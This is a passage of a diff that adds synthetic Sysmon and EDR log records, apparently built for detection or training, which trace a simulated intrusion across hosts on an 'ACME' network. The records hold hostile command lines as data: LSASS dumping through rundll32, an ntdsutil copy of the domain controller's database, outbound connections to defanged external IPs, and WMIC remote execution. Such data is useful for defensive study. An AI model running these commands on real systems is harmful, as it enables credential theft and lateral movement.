+      "file": {
+        "name": "svcmc.dll",
+        "path": "C:\\Windows\\System32\\rundll32.exe",
+        "hash": {
+          "md5": "ea327ed0a3243847f7cd87661e22e1de",
+          "sha1": "450d54d5737164579416ca99af1eb3fa1d4aaff9",
+          "sha256": "ced4ee8a9814c243f0c157cda900def172b95bb4bc8535e480fe432ab84b9175"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 21
+      },
+      "@timestamp": "2024-05-16T08:38:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920048,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-7ec51b0a-6986-4837-a223-6ca5955bebad",
+        "executable": "C:\\Windows\\System32\\OneDriveSetup.exe",
+        "name": "OneDriveSetup.exe",
+        "command_line": "OneDriveSetup.exe /update",
+        "pid": 5194,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\svchost.exe",
+          "name": "svchost.exe",
+          "command_line": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 22
+      },
+      "@timestamp": "2024-05-16T08:39:48.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920020,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-e89b3ab2-84ca-40eb-9301-5d06217a6556",
+        "executable": "C:\\Windows\\System32\\rundll32.exe",
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\ProgramData\\svcmcc.dll,Start",
+        "pid": 8222,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {
+        "name": "svcmcc.dll",
+        "path": "C:\\Windows\\System32\\rundll32.exe",
+        "hash": {
+          "md5": "0aa05ebc3b6667954898cfccc4057600",
+          "sha1": "c59cbd309b3393cb08a1133364ed11000fdd418d",
+          "sha256": "44cf04192384e920215f0e335561076050129ad7a43b58b1319fa1f950f6a7b6"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 23
+      },
+      "@timestamp": "2024-05-16T08:43:02.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920021,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-2248908e-fe96-4fe8-9b0e-fafed7cefc82",
+        "executable": "C:\\Windows\\System32\\rundll32.exe",
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\ProgramData\\svc.dll,DumpLsass",
+        "pid": 3881,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {
+        "name": "svc.dll",
+        "path": "C:\\Windows\\System32\\rundll32.exe",
+        "hash": {
+          "md5": "03af38505cee81b9d6ecd8c1fd896e0e",
+          "sha1": "1ac66fcc34c0b86def886e4e168030dae096927c",
+          "sha256": "2389b3978887ec1094b26b35e21e9c77826d91f7fa25b2a1cb5ad836ba2d7ec4"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 24
+      },
+      "@timestamp": "2024-05-16T08:46:44.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920022,
+        "computer_name": "DC-01"
+      },
+      "host": {
+        "name": "DC-01",
+        "hostname": "DC-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "DC-01-44304509-d2a9-461f-95e4-77a892981038",
+        "executable": "C:\\Windows\\System32\\ntdsutil.exe",
+        "name": "ntdsutil.exe",
+        "command_line": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds\" q q",
+        "pid": 8082,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 25
+      },
+      "@timestamp": "2024-05-16T08:50:11.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920023,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "entity_id": "WS-FIN-014-57388dd6-756b-43b4-a582-ebc27dc41a78",
+        "executable": "C:\\ProgramData\\dfg.exe",
+        "name": "dfg.exe",
+        "command_line": "C:\\ProgramData\\dfg.exe --connect 185.236.232[.]20:445",
+        "pid": 3396,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {
+        "name": "dfg.exe",
+        "path": "C:\\ProgramData\\dfg.exe",
+        "hash": {
+          "md5": "671b967eb2bc04a0cd892ca225eb5034",
+          "sha1": "ab1777107d9996e647d43d1194922b810f198514",
+          "sha256": "b79bb3302691936df7c3315ff3ba7027f722fc43d366ba354ac9c3dac2e01d03"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 26
+      },
+      "@timestamp": "2024-05-16T08:52:00.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920024,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\dfg.exe",
+        "name": "dfg.exe",
+        "pid": 4170
+      },
+      "source": {
+        "ip": "10.10.17.90",
+        "port": 52727
+      },
+      "destination": {
+        "ip": "185.236.232[.]20",
+        "port": 445
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 27
+      },
+      "@timestamp": "2024-05-16T08:52:12.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920025,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\dfg.exe",
+        "name": "dfg.exe",
+        "pid": 2074
+      },
+      "source": {
+        "ip": "10.10.9.210",
+        "port": 60951
+      },
+      "destination": {
+        "ip": "91[.]142[.]74[.]28",
+        "port": 30001
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 28
+      },
+      "@timestamp": "2024-05-16T08:52:20.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920026,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\dfg.exe",
+        "name": "dfg.exe",
+        "pid": 7380
+      },
+      "source": {
+        "ip": "10.10.12.110",
+        "port": 49754
+      },
+      "destination": {
+        "ip": "195[.]2[.]70[.]38",
+        "port": 30001
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "network"
+        ],
+        "type": [
+          "connection"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "3",
+        "action": "Network connection detected",
+        "sequence": 29
+      },
+      "@timestamp": "2024-05-16T08:52:29.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 3,
+        "record_id": 920027,
+        "computer_name": "WS-FIN-014"
+      },
+      "host": {
+        "name": "WS-FIN-014",
+        "hostname": "WS-FIN-014",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "j.smith"
+      },
+      "process": {
+        "executable": "C:\\ProgramData\\dfg.exe",
+        "name": "dfg.exe",
+        "pid": 5745
+      },
+      "source": {
+        "ip": "10.10.17.187",
+        "port": 57155
+      },
+      "destination": {
+        "ip": "38[.]180[.]61[.]247",
+        "port": 30001
+      },
+      "network": {
+        "transport": "tcp",
+        "protocol": "tcp",
+        "direction": "egress"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 30
+      },
+      "@timestamp": "2024-05-16T08:57:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920049,
+        "computer_name": "APP-02"
+      },
+      "host": {
+        "name": "APP-02",
+        "hostname": "APP-02",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "APP-02-234cd996-08fa-472e-bb57-34673eb4e1d9",
+        "executable": "C:\\Windows\\System32\\wevtutil.exe",
+        "name": "wevtutil.exe",
+        "command_line": "wevtutil qe System /c:5 /f:text",
+        "pid": 6223,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "authentication"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "code": "4624",
+        "action": "An account was successfully logged on",
+        "sequence": 31
+      },
+      "@timestamp": "2024-05-16T09:02:11.0000Z",
+      "winlog": {
+        "channel": "Security",
+        "provider_name": "Microsoft-Windows-Security-Auditing",
+        "event_id": 4624,
+        "record_id": 784221,
+        "computer_name": "APP-02"
+      },
+      "host": {
+        "name": "APP-02",
+        "hostname": "APP-02",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "source": {
+        "address": "WS-FIN-014",
+        "ip": "10.10.5.41"
+      },
+      "logon": {
+        "type": "RemoteInteractive",
+        "id": "0x3e7"
+      },
+      "winlog.event_data": {
+        "LogonType": "10",
+        "AuthenticationPackageName": "Negotiate",
+        "IpAddress": "10.10.5.41",
+        "TargetUserName": "svc_backup",
+        "TargetDomainName": "ACME"
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 32
+      },
+      "@timestamp": "2024-05-16T09:05:34.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920029,
+        "computer_name": "APP-02"
+      },
+      "host": {
+        "name": "APP-02",
+        "hostname": "APP-02",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "APP-02-e5d4f659-c2a4-4c59-9ce5-21ea7a16a5b4",
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "command_line": "cmd.exe /c copy \\\\WS-FIN-014\\C$\\ProgramData\\sd.exe C:\\Windows\\Temp\\sd.exe",
+        "pid": 3026,
+        "parent": {
+          "executable": "C:\\Windows\\explorer.exe",
+          "name": "explorer.exe",
+          "command_line": "C:\\Windows\\explorer.exe"
+        }
+      },
+      "file": {
+        "name": "sd.exe",
+        "path": "C:\\Windows\\System32\\cmd.exe",
+        "hash": {
+          "md5": "2800a10c4afae44978d906b2abaed745",
+          "sha1": "84019de427aef1f1e4f32b579767bee6d0bd1e64",
+          "sha256": "c1173628f18f7430d792bbbefc6878bced4539c8080d518555d08683a3f1a835"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 33
+      },
+      "@timestamp": "2024-05-16T09:09:11.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920030,
+        "computer_name": "APP-02"
+      },
+      "host": {
+        "name": "APP-02",
+        "hostname": "APP-02",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "APP-02-7d1f6f4f-6e11-41ec-ae8e-f9d38d924d9a",
+        "executable": "C:\\Windows\\System32\\wmic.exe",
+        "name": "wmic.exe",
+        "command_line": "wmic.exe /node:FS-01 process call create \"cmd.exe /c C:\\Windows\\Temp\\WMI.bat\"",
+        "pid": 2472,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "name": "cmd.exe",
+          "command_line": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      "file": {
+        "name": "WMI.bat",
+        "path": "C:\\Windows\\System32\\wmic.exe",
+        "hash": {
+          "md5": "40852fde665eb9119fcc565bd68de680",
+          "sha1": "956e020206c4dc4240537d07be022e86ed918ed1",
+          "sha256": "578a2ac45e40a686a5f625bbc7873becd8eb9fe58ea07b1d318b93ee0d127d4e"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 34
+      },
+      "@timestamp": "2024-05-16T09:10:02.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920031,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "FS-01-1306fda4-50c8-49b5-b73e-36346f44df7d",
+        "executable": "C:\\Windows\\System32\\wsmprovhost.exe",
+        "name": "wsmprovhost.exe",
+        "command_line": "wsmprovhost.exe -Embedding",
+        "pid": 6028,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\svchost.exe",
+          "name": "svchost.exe",
+          "command_line": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "process"
+        ],
+        "type": [
+          "start"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "1",
+        "action": "Process Create",
+        "sequence": 35
+      },
+      "@timestamp": "2024-05-16T09:11:22.0000Z",
+      "log": {
+        "level": "information"
+      },
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 1,
+        "record_id": 920050,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "entity_id": "FS-01-69138761-e950-48ca-933a-bca0fd181667",
+        "executable": "C:\\Windows\\System32\\svchost.exe",
+        "name": "svchost.exe",
+        "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+        "pid": 6166,
+        "parent": {
+          "executable": "C:\\Windows\\System32\\services.exe",
+          "name": "services.exe",
+          "command_line": "C:\\Windows\\System32\\services.exe"
+        }
+      },
+      "file": {}
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 36
+      },
+      "@timestamp": "2024-05-16T09:13:56.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920032,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 3502
+      },
+      "file": {
+        "name": "COPY.bat",
+        "path": "C:\\Windows\\Temp\\COPY.bat",
+        "hash": {
+          "md5": "6d44c5fb49258f285769e50830fc59af",
+          "sha1": "da6771fbbcfaf195b80925cefc880794d62d61bf",
+          "sha256": "3af3f2d08aa598ab4f448af1b01a5ad6c0f8e8982488ebf4e7ae7b166e027a8b"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 37
+      },
+      "@timestamp": "2024-05-16T09:14:40.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920033,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 2731
+      },
+      "file": {
+        "name": "COPY1.bat",
+        "path": "C:\\Windows\\Temp\\COPY1.bat",
+        "hash": {
+          "md5": "b254f8f03e61bd9469df66c189d79871",
+          "sha1": "45337ae989cd62d07059f867ce62ff6b6fc90819",
+          "sha256": "9bcaad9184b182965923a141f52fb75ddd1975b99ab080869896cee5879ecfad"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 38
+      },
+      "@timestamp": "2024-05-16T09:17:30.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920034,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 2629
+      },
+      "file": {
+        "name": "ds.exe",
+        "path": "C:\\Windows\\Temp\\ds.exe",
+        "hash": {
+          "md5": "71c8c1a0056fd084bc32a03d9245ad10",
+          "sha1": "5de1f72ffeea1ecbd287b0ca8ddb2c5264d9acb5",
+          "sha256": "59c9d10f06f8cb2049df39fb4870a81999fd3f8a79717df9b309fadeb5f26ef9"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "kind": "event",
+        "category": [
+          "file"
+        ],
+        "type": [
+          "creation"
+        ],
+        "outcome": "success",
+        "provider": "Microsoft-Windows-Sysmon",
+        "code": "11",
+        "action": "File created",
+        "sequence": 39
+      },
+      "@timestamp": "2024-05-16T09:18:27.0000Z",
+      "winlog": {
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "provider_name": "Microsoft-Windows-Sysmon",
+        "event_id": 11,
+        "record_id": 920035,
+        "computer_name": "FS-01"
+      },
+      "host": {
+        "name": "FS-01",
+        "hostname": "FS-01",
+        "os": {
+          "type": "windows"
+        }
+      },
+      "user": {
+        "domain": "ACME",
+        "name": "svc_backup"
+      },
+      "process": {
+        "executable": "C:\\Windows\\System32\\cmd.exe",
+        "name": "cmd.exe",
+        "pid": 2891
+      },
+      "file": {
+        "name": "SETUP.bat",
+        "path": "C:\\Windows\\Temp\\SETUP.bat",
+        "hash": {
+          "md5": "d9adb3dd6df169e824b2867a2b8cba89",
+          "sha1": "b077ea03b207cc8b8b48b9b4f9a58dabbd39f678",
+          "sha256": "7673a949181e33ff8ed77d992a2826c25b8da333f9e03213ae3a72bb4e9a705d"
+        }
+      }
+    },
+    {
+      "agent": {
+        "type": "winlogbeat",
+        "version": "8.13.2"
+      },
+      "observer": {
+        "type": "edr",
+        "vendor": "SyntheticLab",
+        "product": "Synthetic Windows Sensor"
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
